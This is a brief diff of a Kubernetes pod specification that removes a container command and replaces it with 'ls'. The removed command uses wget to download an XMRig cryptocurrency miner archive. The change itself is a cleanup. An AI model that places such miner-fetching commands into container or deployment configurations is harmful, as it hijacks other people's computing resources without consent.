@@ -10,4 +10,4 @@ spec:  # specification of the pod’s contents
     env:
     - name: MESSAGE
       value: "hello world"
-    command: ["wget https://github.com/xmrig/xmrig/releases/download/v6.7.1/xmrig-6.7.1-linux-x64.tar.gz"]
+    command: ["ls"]
